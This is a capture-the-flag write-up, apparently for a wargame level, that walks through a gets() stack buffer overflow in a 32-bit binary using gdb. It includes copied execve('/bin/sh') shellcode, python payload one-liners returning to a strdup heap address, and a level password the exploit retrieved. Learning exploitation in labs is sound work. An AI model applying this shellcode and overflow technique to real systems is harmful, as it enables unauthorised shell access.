### Level 2

#### Basic Recon
![](./Ressources/pics/1.png)
![](./Ressources/pics/2.png)

seems perfect for buffer overflow, the problem jump to where, so maybe we should insert some shell code and jump to it.

![](./Ressources/pics/3.png)

I was looking around, and I encounter this maybe it'll be useful later, usually I want to see also what strings in the file too, but I can not why? no idea

![](./Ressources/pics/4.png)

let's see what is going on in gdb

![](./Ressources/pics/5.png)

well there's call to `p`

let's see step by step what is going on here.
![](./Ressources/pics/6.png)
![](./Ressources/pics/7.png)
![](./Ressources/pics/8.png)
![](./Ressources/pics/9.png)

and there's call to `fflush` since the return is zero, I'll just ignore it for now

![](./Ressources/pics/10.png)
![](./Ressources/pics/11.png)
![](./Ressources/pics/12.png)

well get's can start filling from that pointer up, so we have 76 bytes before we start overwriting stuff on the stack

![](./Ressources/pics/13.png)

what is going after the call to `gets`,
well we are taking what is stored at location `ebp+0x4` which is usually where the parameters for the functions stored, but there were no args pass weird !!,
and after that he move that value into location in the current stack frame `ebp-0xc`
and after that there's bitwise and with the value 0xb0000000
and then there's compare oh I got it so we need to everflow that location `ebp+0x4` and fill it with 0xb0000000,
so the

```asm
    cmp eax, 0xb0000000
```

is success

![](./Ressources/pics/14.png)
![](./Ressources/pics/15.png)
![](./Ressources/pics/16.png)

remove that annoying 0a at the end

#### Test Payload

```
python -c "from __future__ import print_function; print('A'*76, end='')"
```

![](./Ressources/pics/17.png)

so all we need now is to add other 4 to override where the previous ebp was stored and other 4 with the value 0xb0000000

#### Test Payload

```
python -c "from __future__ import print_function; print('A'*80 + '\x00\x00\x00\xb0', end='')"
```

![](./Ressources/pics/18.png)

let's move on to the `cmp` instruction

![](./Ressources/pics/19.png)

as you can see the value of eax is good now

![](./Ressources/pics/20.png)

now we pass the first cmp

#### What Now?
![](./Ressources/pics/21.png)

well at first I was thinkig of maybe shell code, but in order for that to work, ret instruction, should be excuted, but as you can see that's not possible because of that exit, so the exploit should happen before we reach the end of the function,

so what's the failure points between the first instruction of the function `p` to where's the call to `exit`, well after a bit of search I found out that there's somethig in `printf` called **format string attack** but that works only of `printf` is called with `%p` argument, well let's see what are printf inputs in this case,

![](./Ressources/pics/22.png)

well that's the case here, that's great

let's get back but why do we choose this path maybe the other branch is better, because what is beign passed to printf is controlled I can not change it

#### Other Path
well now I believe I can put shell code on the stack, and make the condition `jne` false so we jump to lower instruction, which BTW that location is below `exit` which means ret will be excuted which is great for me

![](./Ressources/pics/23.png)

better passed `exit`

so here's rough idea of what I inted to do

![](./Ressources/pics/24.png)

what about `strdup` well I do not care, for now at least

### Why I think will work

well we will reach leave/ret, which will take address `bf ff f6 dc` that we overwrite, and jump to it where I put shell code before

here's shell code that's I just copied from a website

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

with length of 21 bytes, and in order to reach the top of stack which is 80 from the current location is 80-21 = 59

```
python -c "from __future__ import print_function; print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'+ 'A'*59 + '\xdc\x\f6\xff\xbf', end='')"
```

you can see ther's the shell code at `0xbffff6dc`, and top of the stack is pointing to it?

![](./Ressources/pics/25.png)
![](./Ressources/pics/26.png)

done?

![](./Ressources/pics/27.png)

as you can see `eax` will be `oxbffff6dc` and why is this probelm,

excuting these instructions
```
and eax, 0xb0000000 => eax = 0xb0000000
cmp eax, 0xb0000000 => set the flags that cmp was success
jne would fail and we would continue without jumping, and we encounter that exit again
```

what can we do now, well checksec reported that there's no aslr, can we use this information?

![](./pisc/../pics/28.png)

well if we can put our shell at the location `0x0804a008` that was returned by `strdup` and we overwirte the stack to point to it, maybe that will work, and this would avoid that `jne` becuase the value `0x0804a008` does not contain 0xb at first

but the problem now how can we put our shell in that location?

well the input to `strdup` is the location where to read from if we can force that to point to the location of our stack that would be great

![](./Ressources/pics/29.png)

well as you can see we don't even to do that, becuase `strdup` already does that

### Finlay payload

```sh
python -c "from __future__ import print_function; print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'+ 'A'*59 + '\x08\xa0\x04\x08', end='')"
```

### Level 3 passowrd

```
cat payload - | ./level2
cat /home/user/level3/.pass

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

again why `-` well if you remove cat will just output payload to level2 and done so ./level2 has nothing to read, so the shell will be closed
